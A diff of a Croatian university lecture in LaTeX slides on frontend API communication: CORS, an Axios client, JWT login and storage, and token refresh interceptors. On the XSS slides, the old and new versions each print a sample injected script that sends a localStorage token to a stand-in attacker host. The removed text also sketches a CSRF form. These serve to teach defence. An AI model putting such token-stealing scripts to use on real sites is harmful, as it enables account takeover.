@@ -2,8 +2,8 @@
 % !TeX root = predavanje08.tex
 \input{../common/preamble.tex}
 
-\title[Programiranje za web]{Programiranje za web - Predavanje 8 \\ API komunikacija, auth flow i route guardovi}
-\date{30.11.2026.}
+\title[Predavanje 8: Komunikacija s API-jem]{Programiranje za web \\ Predavanje 8: Komunikacija s API-jem i prijava korisnika}
+\date{03.12.2026.}
 
 \begin{document}
 
@@ -12,146 +12,126 @@
 % ------------------------------------------------------------
 \begin{frame}{Plan predavanja}
 \begin{enumerate}
-  \item HTTP komunikacija iz frontenda (Axios)
-  \item API client wrapper s base URL i interceptorima
-  \item Auth store: login, token storage, refresh
-  \item Login stranica
-  \item Route guardovi po roli
-  \item Globalni error handling
-  \item Commitovi za ovo predavanje
+  \item Zahtjev iz preglednika
+  \item Jedno mjesto za slanje zahtjeva
+  \item Prijava i token
+  \item Token koji istekne
+  \item Zaštita prikaza i pogreške
 \end{enumerate}
 
 \vspace{0.6em}
-Na kraju predavanja: korisnik se može prijaviti, frontend pamti token, zaštićene rute traže autentikaciju.
+Prikaz se mijenja kad se podatak promijeni, ali podatke dosad nije imao odakle dobiti. Ovo predavanje spaja klijentski dio s API-jem i vodi korisnika kroz prijavu.
 \end{frame}
 
 % ------------------------------------------------------------
 \begin{frame}{Ishodi učenja}
 Nakon ovog predavanja student može:
+
 \begin{itemize}
-  \item konfigurirati Axios instance s base URL-om i interceptorima
-  \item implementirati auth store koji upravlja JWT tokenima
-  \item objasniti zašto se access token drži u memoriji, a refresh u httpOnly cookieu ili localStorageu
-  \item implementirati route guard koji provjerava autentikaciju i rolu
-  \item hendlati 401 response automatskim refreshom tokena
+  \item objasniti zašto zahtjev koji prolazi iz alata ne prolazi iz preglednika
+  \item postaviti zajedničkog klijenta koji svakom zahtjevu dodaje zaglavlje s tokenom
+  \item napisati tijek prijave od obrasca do spremljenog tokena
+  \item objasniti izbor mjesta na kojem token stoji i što taj izbor nosi
+  \item obnoviti istekli token bez sudjelovanja korisnika
+  \item spriječiti otvaranje prikaza koji prijavljenom korisniku ne pripada
 \end{itemize}
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Kako frontend komunicira s backendom}
-Frontend ne pristupa bazi direktno. Sva komunikacija ide kroz HTTP:
+\begin{frame}{Domena primjera}
+Klub se prijavljuje svojim računom i od tog trenutka radi samo sa svojim natjecateljima i svojim prijavama. Organizator vidi sve.
 
-\vspace{0.4em}
-\begin{center}
-\texttt{Vue komponenta $\rightarrow$ API client $\rightarrow$ HTTP $\rightarrow$ FastAPI $\rightarrow$ PostgreSQL}
-\end{center}
+\vspace{0.9em}
+Backend to već provodi: zahtjev bez tokena dobiva \texttt{401}, a zahtjev nad tuđim zapisom \texttt{403}. Token vrijedi petnaest minuta, a uz njega se izdaje i dugotrajni token kojim se dobiva novi.
 
-\vspace{0.6em}
-\begin{tabular}{@{}lll@{}}
-  \toprule
-  \textbf{Akcija u UI-ju} & \textbf{HTTP metoda} & \textbf{Endpoint} \\
-  \midrule
-  Prijava korisnika & POST & \codefile{/auth/login} \\
-  Dohvat natjecatelja & GET & \codefile{/clubs/\{id\}/lifters} \\
-  Dodavanje natjecatelja & POST & \codefile{/clubs/\{id\}/lifters} \\
-  Promjena kategorije & PATCH & \codefile{/competitions/\{id\}/registrations/\{id\}} \\
-  \bottomrule
-\end{tabular}
+\vspace{0.9em}
+Klijentski dio mora taj tijek voditi tako da korisnik lozinku upiše jednom, a zatim radi bez prekida dok god je prijavljen.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{HTTP iz browsera: Fetch vs Axios}
-\begin{columns}[T]
-\column{0.48\textwidth}
-\textbf{Fetch API (native)}
+\begin{frame}[fragile]{Zahtjev koji u alatu prolazi (I)}
+U \texttt{/docs} ovaj zahtjev vraća popis natjecatelja:
+
+\begin{lstlisting}
+GET http://localhost:8000/clubs/12/lifters
+Authorization: Bearer <token kluba 12>
+\end{lstlisting}
+
+\vspace{0.5em}
+Isti poziv iz komponente koja se izvodi na \texttt{http://localhost:5173}:
+
+\begin{lstlisting}[language=typescript]
+const res = await fetch('http://localhost:8000/clubs/12/lifters')
+\end{lstlisting}
+
+\vspace{0.5em}
+Poslužitelj se ne mijenja, zahtjev se ne mijenja, a u konzoli stoji poruka da je zahtjev blokiran.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Zahtjev koji u alatu prolazi (II)}
+Zahtjev nije blokirao poslužitelj. Blokirao ga je preglednik, i to nakon što je odgovor već stigao.
+
+\vspace{0.9em}
+Razlika je u tome tko šalje. Alat za slanje zahtjeva nema stranicu u ime koje radi. Preglednik ima: stranica je učitana s jedne adrese, a zahtjev ide na drugu.
+
+\vspace{0.9em}
+Preglednik u toj situaciji štiti korisnika od stranice koju je upravo otvorio. To pravilo opisuje prva cjelina.
+\end{frame}
+
+% ============================================================
+\sekcija{Zahtjev iz preglednika}{Pravilo istoga izvora, zaglavlja kojima poslužitelj dopušta iznimku, predzahtjev i postavljanje dopuštenja.}
+
+% ------------------------------------------------------------
+\begin{frame}{Pravilo istoga izvora}
+Izvor stranice čine tri podatka: shema, ime domaćina i vrata. \texttt{http://localhost:5173} i \texttt{http://localhost:8000} razlikuju se u vratima, pa su dva izvora.
+
+\vspace{0.9em}
+Skripta učitana s jednog izvora po pravilu ne smije čitati odgovore s drugoga. To se pravilo naziva \textbf{pravilo istoga izvora} (engl. \emph{same-origin policy}).
+
+\vspace{0.9em}
+Bez njega bi stranica koju korisnik otvori mogla u njegovo ime slati zahtjeve svakoj aplikaciji u koju je prijavljen i čitati ono što dobije.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Dopuštenje koje daje poslužitelj}
+Pravilo ima iznimku i daje je poslužitelj. Uz odgovor šalje zaglavlje kojim imenuje izvore kojima dopušta čitanje:
+
+\begin{lstlisting}
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: http://localhost:5173
+Access-Control-Allow-Credentials: true
+\end{lstlisting}
+
+\vspace{0.5em}
+Preglednik odgovor pokaže skripti samo ako se izvor stranice nalazi u tom zaglavlju. Taj se mehanizam naziva \textbf{CORS}, dijeljenje među izvorima (engl. \emph{cross-origin resource sharing}).
+
+\vspace{0.5em}
+Dopuštenje time nije postavka klijenta. Zapisuje se na poslužitelju i mijenja se ondje.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Predzahtjev}
+Neke zahtjeve preglednik ne šalje odmah. Prvo pita smije li ih poslati.
+
+\vspace{0.7em}
 \begin{itemize}
-  \item Ugrađen u browser - nema dependencija
-  \item Ne baca exception na 4xx/5xx (samo network error)
-  \item Ručno parsiranje JSON-a (\texttt{.json()})
-  \item Nema interceptore
+  \itemsep0.45em
+  \item \texttt{GET} bez posebnih zaglavlja šalje se izravno, a odgovor se odbacuje ako dopuštenja nema.
+  \item \texttt{POST} s tijelom u JSON-u, \texttt{PATCH}, \texttt{DELETE} i svaki zahtjev s vlastitim zaglavljem, uključujući \texttt{Authorization}, dobivaju prethodno pitanje.
+  \item To je zaseban zahtjev metodom \texttt{OPTIONS}, nazvan \textbf{predzahtjev} (engl. \emph{preflight}).
 \end{itemize}
 
-\column{0.48\textwidth}
-\textbf{Axios}
-\begin{itemize}
-  \item Automatski JSON parse/serialize
-  \item Baca exception na 4xx/5xx
-  \item Request i response interceptori
-  \item Konfigurabilni timeout
-  \item Širi browser support
-\end{itemize}
-\end{columns}
-
-\vspace{0.6em}
-Za projekt s auth flowom, interceptorima i error handlingom, Axios štedi dosta boilerplate koda. Za jednostavan GET request, Fetch je sasvim dovoljan.
+\vspace{0.7em}
+Poslužitelj na njega odgovara popisom dopuštenih metoda i zaglavlja. Tek ako se traženo nalazi u tom popisu, preglednik šalje pravi zahtjev.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Što su interceptori}
-Interceptori su \textbf{middleware} za HTTP requestove i responseove. Svaki request/response prolazi kroz njih prije nego što dođe do komponente.
-
-\vspace{0.6em}
-\begin{center}
-\texttt{Komponenta $\rightarrow$ Request interceptor $\rightarrow$ Server $\rightarrow$ Response interceptor $\rightarrow$ Komponenta}
-\end{center}
-
-\vspace{0.6em}
-\begin{tabular}{@{}lp{8cm}@{}}
-  \toprule
-  \textbf{Tip} & \textbf{Upotreba} \\
-  \midrule
-  Request interceptor & Dodaj Authorization header na svaki request \\
-  Response interceptor & Uhvati 401, napravi token refresh, ponovi request \\
-  Error interceptor & Centralizirano logiranje grešaka \\
-  \bottomrule
-\end{tabular}
-
-\vspace{0.4em}
-Bez interceptora biste morali ručno dodavati token i hendlati 401 u svakoj komponenti.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Async/await na frontendu}
-API pozivi su asinkroni - ne blokiraju UI dok čekamo odgovor servera.
-
-\vspace{0.4em}
-\begin{enumerate}
-  \item Korisnik klikne gumb $\rightarrow$ pokrene se async funkcija
-  \item Postavimo \texttt{loading = true} $\rightarrow$ UI prikaže spinner
-  \item \texttt{await api.get(...)} $\rightarrow$ čekamo odgovor (UI ostaje responsivan)
-  \item Odgovor stigne $\rightarrow$ ažuriramo podatke $\rightarrow$ \texttt{loading = false}
-  \item Ako dođe do greške $\rightarrow$ \texttt{catch} blok prikaže poruku
-\end{enumerate}
-
-\vspace{0.6em}
-\texttt{async/await} je sintaktički šećer nad Promiseima. Čini asinkroni kod čitljivim kao sinkroni, ali ne blokira main thread.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{CORS: zašto browser blokira, a Postman ne}
-Browser primjenjuje \textbf{Same-Origin Policy} - JavaScript može slati requestove samo na isti origin s kojeg je stranica učitana.
-
-\vspace{0.4em}
-\begin{tabular}{@{}ll@{}}
-  \toprule
-  \textbf{Alat} & \textbf{Blokira cross-origin?} \\
-  \midrule
-  Browser (Chrome, Firefox) & Da - zaštita korisnika \\
-  Postman / curl & Ne - nema origin koncept \\
-  Backend-to-backend & Ne - server nema origin policy \\
-  \bottomrule
-\end{tabular}
-
-\vspace{0.6em}
-Ovo je \textbf{sigurnosna zaštita} za krajnjeg korisnika. Bez nje, maliciozna stranica bi mogla slati requestove na API vaše banke koristeći vaše cookieje. CORS je mehanizam kojim backend eksplicitno dopušta iznimke.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}[fragile,shrink=5]{CORS u praksi: prvi request će vam pasti}
-Vite dev server je na \texttt{:5173}, FastAPI na \texttt{:8000} - različiti origini. Prvi Axios poziv završava s \enquote{blocked by CORS policy} u konzoli dok backend ne dopusti vaš origin:
+\begin{frame}[fragile]{Dopuštenje u aplikaciji}
+U FastAPI-ju dopuštenje postavlja međusloj pri sastavljanju aplikacije:
 
 \begin{lstlisting}[language=python]
-# app/main.py (backend!)
+# app/main.py
 from fastapi.middleware.cors import CORSMiddleware
 
 app.add_middleware(
@@ -164,562 +144,521 @@ app.add_middleware(
 \end{lstlisting}
 
 \vspace{0.4em}
-Ovo je dev konfiguracija - dovoljna do kraja semestra. Produkcijsku verziju s env varijablom i preflight detaljima radimo u Predavanju 12. Zapamtite simptom: frontend \enquote{ne radi}, a greška je na backendu.
+Popis izvora navodi se izrijekom. Zvjezdica na tom mjestu dopušta svakoj stranici čitanje odgovora i ne smije ostati u objavljenoj aplikaciji.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile,shrink=5]{Axios: API client wrapper}
+\begin{frame}{Vježba: zahtjev iz preglednika}
+Backend je pokrenut na \texttt{http://localhost:8000}. Otvorite bilo koju stranicu koja nije na toj adresi, primjerice \texttt{https://www.unizd.hr}, i u njoj konzolu alata za razvoj.
+
+\vspace{0.8em}
+\begin{enumerate}
+  \itemsep0.4em
+  \item Pošaljite \texttt{await fetch('http://localhost:8000/health')} i pročitajte poruku.
+  \item Prijeđite na karticu Mreža i pogledajte je li zahtjev uopće poslan i koji je status vraćen.
+  \item Dodajte u backend međusloj iz ovog predavanja i ponovite prvi korak.
+  \item Promijenite popis dopuštenih izvora u \texttt{["http://example.com"]} i ponovite.
+\end{enumerate}
+
+\vspace{0.8em}
+U kojem je koraku zahtjev stigao do poslužitelja, a odgovor ipak nije bio dostupan skripti?
+\end{frame}
+
+% ============================================================
+\sekcija{Jedno mjesto za slanje zahtjeva}{Posao koji se ponavlja u svakom pozivu, zajednički klijent, tipizirani pozivi i čekanje odgovora.}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Isti posao u svakom pozivu}
+Zahtjev napisan izravno u komponenti nosi i sve što uz njega ide:
+
 \begin{lstlisting}[language=typescript]
-// src/api/client.ts
-import axios, { type AxiosError,
-  type InternalAxiosRequestConfig } from 'axios'
+const res = await fetch('http://localhost:8000/clubs/12/lifters', {
+  headers: {
+    'Content-Type': 'application/json',
+    Authorization: `Bearer ${localStorage.getItem('access_token')}`,
+  },
+})
+if (!res.ok) throw new Error(String(res.status))
+const data = await res.json()
+\end{lstlisting}
+
+\vspace{0.4em}
+Adresa poslužitelja, zaglavlja, pretvorba u JSON i provjera statusa isti su u svakom pozivu. Ako stoje u svakoj komponenti, mijenjaju se u svakoj komponenti.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Zajednički klijent}
+Taj se posao opisuje jednom:
+
+\begin{lstlisting}[language=typescript]
+// api/client.ts
+import axios from 'axios'
 
 const api = axios.create({
-  baseURL: import.meta.env.VITE_API_URL || 'http://localhost:8000',
+  baseURL: import.meta.env.VITE_API_URL,
   headers: { 'Content-Type': 'application/json' },
 })
-
-// Interceptor: dodaje token na svaki request
-api.interceptors.request.use(
-  (config: InternalAxiosRequestConfig) => {
-    const token = localStorage.getItem('access_token')
-    if (token) {
-      config.headers.Authorization = `Bearer ${token}`
-    }
-    return config
-  })
 
 export default api
 \end{lstlisting}
 
 \vspace{0.4em}
-\texttt{baseURL} se čita iz env varijable - drugačiji za dev i produkciju.
+Adresa poslužitelja dolazi iz varijable okoline, pa se ista izgradnja koristi i u razvoju i nakon objave. Knjižnica \texttt{axios} uz to sama pretvara tijelo u JSON i podiže iznimku na odgovoru sa statusom \texttt{4xx} ili \texttt{5xx}.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile,shrink=5]{API pozivi: primjeri}
+\begin{frame}[fragile]{Pozivi po resursu}
+Zahtjevi se grupiraju po resursu, jedna datoteka po skupini, i vraćaju opisane tipove:
+
 \begin{lstlisting}[language=typescript]
-// src/api/auth.ts
+// api/lifters.ts
 import api from './client'
+import type { Lifter } from '@/types'
 
-export interface LoginResponse {
-  access_token: string; refresh_token: string
-}
-
-export async function login(username: string, password: string) {
-  const { data } = await api.post<LoginResponse>('/auth/login', {
-    username, password,
-  })
-  return data
-}
-
-export async function getMe() {
-  const { data } = await api.get('/auth/me')
-  return data
-}
-
-// src/api/lifters.ts
-export async function getLifters(clubId: number) {
-  const { data } = await api.get(`/clubs/${clubId}/lifters`)
+export async function getLifters(clubId: number): Promise<Lifter[]> {
+  const { data } = await api.get<Lifter[]>(`/clubs/${clubId}/lifters`)
   return data
 }
 \end{lstlisting}
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Token storage: opcije}
-\begin{tabular}{@{}lp{4.5cm}p{4.5cm}@{}}
-  \toprule
-  & \textbf{localStorage} & \textbf{Memorija (ref/store)} \\
-  \midrule
-  Persistencija & Ostaje nakon refresh/zatvaranja & Gubi se na refresh \\
-  XSS ranjivost & Da - JS može čitati & Da - ali teže iskoristivo \\
-  Jednostavnost & Jednostavno & Treba refresh token flow \\
-  \bottomrule
-\end{tabular}
-
-\vspace{0.6em}
-Za ovaj kolegij koristimo \textbf{localStorage} jer je jednostavniji. U produkcijskim aplikacijama razmotrite httpOnly cookie za refresh token.
 
 \vspace{0.4em}
-Access token ima kratki životni vijek (15 min) pa čak i ako je ukraden, šteta je ograničena. Refresh token služi za tiho obnavljanje.
+Komponenta time ne zna ni adresu ni zaglavlja. Zna da postoji funkcija koja vraća popis natjecatelja, i to je sve što joj treba.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{XSS napad: kako krade token}
-XSS (Cross-Site Scripting) - napadač ubaci JavaScript u stranicu koji se izvršava u kontekstu korisnika.
+\begin{frame}[fragile]{Čekanje odgovora}
+Odgovor ne stiže odmah, a prikaz se u međuvremenu ne smije zaustaviti:
 
-\vspace{0.4em}
-\begin{enumerate}
-  \item Napadač pronađe input koji se renderira bez escapanja
-  \item Ubaci: \texttt{<script>fetch('https://evil.com?t='+} \\ \texttt{localStorage.getItem('token'))</script>}
-  \item Kad žrtva posjeti stranicu, skripta se izvrši u njezinu browseru
-  \item Token je poslan napadaču - napadač se može prijaviti kao žrtva
-\end{enumerate}
-
-\vspace{0.6em}
-Vue automatski escapa template izraze (\texttt{\{\{...\}\}}) što štiti od većine XSS-a. Opasnost je \texttt{v-html} direktiva koja renderira sirovi HTML - koristiti samo za trusted sadržaj.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{CSRF napad i SameSite zaštita}
-CSRF (Cross-Site Request Forgery) - napadač natjera korisnikov browser da pošalje request na drugi site koristeći postojeći cookie.
-
-\vspace{0.4em}
-\begin{enumerate}
-  \item Korisnik je prijavljen na \texttt{bank.com} (ima session cookie)
-  \item Posjeti \texttt{evil.com} koja ima \texttt{<form action="bank.com/transfer">}
-  \item Browser automatski pošalje cookie s requestom
-  \item Banka izvrši transfer jer je cookie validan
-\end{enumerate}
-
-\vspace{0.6em}
-Zaštita: \texttt{SameSite=Lax} ili \texttt{Strict} na cookieju sprečava slanje cookieja s cross-origin requestova. Mi koristimo \texttt{Authorization} header umjesto cookieja za access token - CSRF nije primjenjiv.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}{Defense in depth za auth}
-Sigurnost ne ovisi o jednom mehanizmu. Kombiniramo više slojeva:
-
-\vspace{0.4em}
-\begin{tabular}{@{}lp{8cm}@{}}
-  \toprule
-  \textbf{Sloj} & \textbf{Što štiti} \\
-  \midrule
-  Kratki access token (15 min) & Ograničava štetu ako je ukraden \\
-  Refresh token (dugotrajan) & Omogućava sesiju bez ponovnog logina \\
-  CORS & Sprečava requestove s neautoriziranih origina \\
-  HTTPS & Sprečava presretanje tokena u transportu \\
-  Input escaping (Vue) & Sprečava XSS koji bi ukrao token \\
-  \bottomrule
-\end{tabular}
-
-\vspace{0.6em}
-Nijedan od ovih mehanizama sam nije dovoljan. Zajedno čine sustav otpornim na najčešće napade.
-\end{frame}
-
-% ------------------------------------------------------------
-\begin{frame}[fragile,shrink=5]{Auth store (Pinia)}
 \begin{lstlisting}[language=typescript]
-// src/stores/auth.ts
-import { defineStore } from 'pinia'
-import { ref, computed } from 'vue'
-import { login as apiLogin, getMe } from '@/api/auth'
+const lifters = ref<Lifter[]>([])
+const loading = ref(false)
 
-interface User { id: number; username: string;
-  role: 'admin' | 'club'; club_id: number | null }
-
-export const useAuthStore = defineStore('auth', () => {
-  const user = ref<User | null>(null)
-  const token =
-    ref<string | null>(localStorage.getItem('access_token'))
-
-  const isAuthenticated = computed(() => !!token.value)
-  const isAdmin = computed(() => user.value?.role === 'admin')
-
-  async function login(username: string, password: string) {
-    const data = await apiLogin(username, password)
-    token.value = data.access_token
-    localStorage.setItem('access_token', data.access_token)
-    localStorage.setItem('refresh_token', data.refresh_token)
-    user.value = await getMe()
+async function ucitaj(clubId: number) {
+  loading.value = true
+  try {
+    lifters.value = await getLifters(clubId)
+  } finally {
+    loading.value = false
   }
-
-  function logout() {
-    token.value = null
-    user.value = null
-    localStorage.removeItem('access_token')
-    localStorage.removeItem('refresh_token')
-  }
-
-  return { user, token, isAuthenticated, isAdmin, login, logout }
-})
+}
 \end{lstlisting}
+
+\vspace{0.4em}
+\texttt{await} zaustavlja samo tu funkciju. Preglednik u tom vremenu i dalje odgovara na klikove, pa stanje \texttt{loading} mora biti vidljivo u prikazu.
+\end{frame}
+
+% ============================================================
+\sekcija{Prijava i token}{Tijek prijave, oblik odgovora, mjesto na kojem token stoji i čime se taj izbor plaća, pohrana prijavljenog korisnika.}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Odgovor na prijavu}
+Prijava je jedan zahtjev. Odgovor nosi dva tokena:
+
+\begin{lstlisting}[language=typescript]
+POST /auth/login
+{"username": "behemot@plreg.hr", "password": "..."}
+\end{lstlisting}
+
+\vspace{0.4em}
+\begin{lstlisting}[language=json]
+{"access_token": "eyJhbGciOi...", "refresh_token": "eyJhbGciOi...",
+ "token_type": "bearer"}
+\end{lstlisting}
+
+\vspace{0.4em}
+Prvi putuje uz svaki sljedeći zahtjev i vrijedi petnaest minuta. Drugi se šalje samo na \texttt{/auth/refresh} i vrijedi sedam dana.
+
+\vspace{0.4em}
+Tko je prijavljen, odgovor ne govori. To vraća \texttt{GET /auth/me}, i to iz zapisa u bazi.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile,shrink=5]{Login stranica}
-\begin{lstlisting}[language=html]
-<script setup lang="ts">
-import { ref } from 'vue'
-import { useRouter } from 'vue-router'
-import { useAuthStore } from '@/stores/auth'
-
-const auth = useAuthStore()
-const router = useRouter()
-const username = ref('')
-const password = ref('')
-const error = ref('')
-
-async function handleLogin() {
-  try {
-    error.value = ''
-    await auth.login(username.value, password.value)
-    router.replace('/')
-  } catch (e) {
-    error.value = 'Pogresan username ili lozinka'
-  }
+\begin{frame}{Gdje token stoji}
+\vspace{0.3em}
+\begin{center}
+{\small
+\setlength{\tabcolsep}{6pt}
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{@{}L{3.3cm}L{4.0cm}L{4.0cm}@{}}
+  \toprule
+   & \textbf{U memoriji} & \textbf{\texttt{localStorage}} \\
+  \midrule
+  Nakon osvježavanja & nestaje & ostaje \\
+  Čita ga skripta & da & da \\
+  Prijava traje & do osvježavanja & do isteka tokena \\
+  \bottomrule
+\end{tabular}
 }
+\end{center}
+
+\vspace{0.6em}
+Obje pohrane skripta čita, pa nijedna ne štiti od napada koji u stranicu ubaci svoju skriptu. Razlikuju se po tome koliko dugo vrijedi ono što napadač uzme.
+
+\vspace{0.4em}
+\begin{konvencija}[Izbor, ne pravilo]
+U ovom projektu oba tokena stoje u \texttt{localStorage}, jer prijava mora preživjeti osvježavanje stranice.
+\end{konvencija}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Napad koji uzima token}
+Stranica koja tuđi tekst prikaže kao HTML dopušta da se uz njega izvede i skripta:
+
+\begin{lstlisting}[language=html]
+<script>
+  fetch('https://zlonamjerna.example/?t='
+        + localStorage.getItem('access_token'))
 </script>
 \end{lstlisting}
+
+\vspace{0.4em}
+Skripta se izvodi u kartici žrtve, s njezinim izvorom, pa joj je dostupno sve što i samoj aplikaciji.
+
+\vspace{0.4em}
+Vue u predlošku svaki izraz ispisuje kao tekst, pa ovakav sadržaj ostane običan niz znakova. Jedina direktiva koja to zaobilazi je \texttt{v-html} i koristi se samo za sadržaj kojemu se vjeruje.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile,shrink=5]{Login stranica: template}
-\begin{lstlisting}[language=html]
-<template>
-  <div class="login-page">
-    <h1>Prijava</h1>
-    <form @submit.prevent="handleLogin">
-      <div>
-        <label>Username</label>
-        <input v-model="username" required />
-      </div>
-      <div>
-        <label>Lozinka</label>
-        <input v-model="password" type="password" required />
-      </div>
-      <p v-if="error" class="error">{{ error }}</p>
-      <button type="submit">Prijavi se</button>
-    </form>
-  </div>
-</template>
+\begin{frame}{Zašto zaglavlje, a ne kolačić}
+Kolačić preglednik dodaje svakom zahtjevu prema toj domeni, i onda kad zahtjev pokrene tuđa stranica. Obrazac na tuđoj stranici tako može izvesti radnju u ime prijavljenog korisnika.
+
+\vspace{0.9em}
+Token u zaglavlju \texttt{Authorization} preglednik ne dodaje sam. Dodaje ga skripta aplikacije, pa zahtjev koji pokrene tuđa stranica ostaje bez njega.
+
+\vspace{0.9em}
+Cijena je da se o pohrani tokena mora brinuti aplikacija i da prijava ne preživi ništa što obriše tu pohranu.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Podatci o prijavljenom korisniku}
+Token, uloga i oznaka kluba trebaju navigaciji, zaštiti prikaza i gotovo svakom popisu. Takav podatak ne pripada nijednoj komponenti, nego pohrani koju dijele:
+
+\begin{lstlisting}[language=typescript]
+// stores/auth.ts
+export const useAuthStore = defineStore('auth', () => {
+  const user = ref<User | null>(null)
+  const token = ref<string | null>(localStorage.getItem('access_token'))
+
+  const prijavljen = computed(() => token.value !== null)
+  const organizator = computed(() => user.value?.role === 'admin')
+
+  return { user, token, prijavljen, organizator }
+})
 \end{lstlisting}
 
 \vspace{0.4em}
-\texttt{@submit.prevent} sprečava defaultno ponašanje forme (page reload). \texttt{v-model} dvosmjerno povezuje input s \texttt{ref()}.
+\texttt{User} je isti opis koji vraća \texttt{/auth/me}: \texttt{id}, \texttt{username}, \texttt{role}, \texttt{club\_id} i \texttt{is\_active}.
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile,shrink=5]{Route guard: zaštita ruta}
+\begin{frame}[fragile]{Prijava u kodu}
 \begin{lstlisting}[language=typescript]
-// src/router/index.ts
-router.beforeEach((to, from) => {
+async function prijava(username: string, password: string) {
+  const data = await apiLogin(username, password)
+  localStorage.setItem('access_token', data.access_token)
+  localStorage.setItem('refresh_token', data.refresh_token)
+  token.value = data.access_token
+  user.value = await getMe()
+}
+
+function odjava() {
+  localStorage.removeItem('access_token')
+  localStorage.removeItem('refresh_token')
+  token.value = null
+  user.value = null
+}
+\end{lstlisting}
+
+\vspace{0.4em}
+Odjava je brisanje pohrane. Izdani token time ne prestaje vrijediti; prestaje biti dostupan ovoj kartici.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Obrazac za prijavu}
+\begin{lstlisting}[language=html]
+<form @submit.prevent="posalji">
+  <input v-model="username" required>
+  <input v-model="password" type="password" required>
+  <p v-if="greska" class="error">{{ greska }}</p>
+  <button type="submit">Prijava</button>
+</form>
+\end{lstlisting}
+
+\vspace{0.4em}
+Bez \texttt{.prevent} preglednik bi obrazac poslao sam i učitao stranicu ponovno, čime bi pokrenuta aplikacija nestala.
+
+\vspace{0.4em}
+Poruka o pogrešci glasi jednako za nepoznato korisničko ime i za krivu lozinku, kao i odgovor poslužitelja. Preciznija poruka odala bi postoji li račun.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Vježba: prijava i zahtjev s tokenom}
+Backend je pokrenut, a početni podatci upisani. Radite u konzoli preglednika, na stranici aplikacije.
+
+\vspace{0.8em}
+\begin{enumerate}
+  \itemsep0.4em
+  \item Pošaljite \texttt{POST /auth/login} s računom kluba \texttt{behemot@plreg.hr} i zabilježite oba tokena.
+  \item Pošaljite \texttt{GET /auth/me} bez zaglavlja \texttt{Authorization}.
+  \item Ponovite isti zahtjev sa zaglavljem \texttt{Authorization: Bearer} i pristupnim tokenom.
+  \item Pošaljite \texttt{GET /auth/me} s tokenom za obnovu umjesto pristupnoga.
+\end{enumerate}
+
+\vspace{0.8em}
+Koje ste statuse dobili u drugom i u četvrtom koraku i po čemu ih poslužitelj razlikuje?
+\end{frame}
+
+% ============================================================
+\sekcija{Token koji istekne}{Zahtjev koji prestane prolaziti, presretači zahtjeva i odgovora, obnova tokena i stanje nakon osvježavanja stranice.}
+
+% ------------------------------------------------------------
+\begin{frame}{Zahtjev koji prestane prolaziti}
+Korisnik se prijavio, radio dvadeset minuta i otvorio popis prijava. Zahtjev je isti kao i svi prije njega, a odgovor je \texttt{401}.
+
+\vspace{0.9em}
+Pristupni token vrijedi petnaest minuta. Kratak vijek je namjeran: token koji dospije u tuđe ruke brzo prestaje vrijediti.
+
+\vspace{0.9em}
+Tražiti od korisnika da se svakih petnaest minuta prijavljuje nije rješenje. Zato uz pristupni token postoji i token za obnovu, kojim se dobiva novi par bez lozinke.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Zaglavlje na svakom zahtjevu}
+Token se ne dodaje u svakom pozivu. Dodaje ga presretač zahtjeva, na jednom mjestu:
+
+\begin{lstlisting}[language=typescript]
+// api/client.ts
+api.interceptors.request.use((config) => {
+  const token = localStorage.getItem('access_token')
+  if (token) {
+    config.headers.Authorization = `Bearer ${token}`
+  }
+  return config
+})
+\end{lstlisting}
+
+\vspace{0.4em}
+Presretač je funkcija kroz koju prolazi svaki zahtjev prije slanja. Pozivi u \codefile{api} ostaju bez spomena tokena, pa se na novom pozivu token ne može zaboraviti.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Obnova pri odgovoru 401}
+Presretač odgovora hvata \texttt{401}, traži novi par tokena i ponavlja izvorni zahtjev:
+
+\begin{lstlisting}[language=typescript]
+api.interceptors.response.use(
+  (res) => res,
+  async (error) => {
+    const zahtjev = error.config
+    if (error.response?.status !== 401 || zahtjev._ponovljen) {
+      return Promise.reject(error)
+    }
+    zahtjev._ponovljen = true
+    await obnoviTokene()
+    return api(zahtjev)
+  },
+)
+\end{lstlisting}
+
+\vspace{0.4em}
+Oznaka \texttt{\_ponovljen} sprječava beskonačan niz: zahtjev koji i nakon obnove dobije \texttt{401} prolazi dalje kao pogreška.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Dva istodobna odgovora 401}
+Prikaz koji se otvara često šalje nekoliko zahtjeva odjednom. Ako je token istekao, svi dobivaju \texttt{401} u istom trenutku.
+
+\vspace{0.7em}
+\begin{itemize}
+  \itemsep0.45em
+  \item Prvi zahtjev pokrene obnovu i dobije novi par tokena.
+  \item Drugi je obnovu pokrenuo prije nego je prvi završio, pa šalje token za obnovu koji je u međuvremenu zamijenjen.
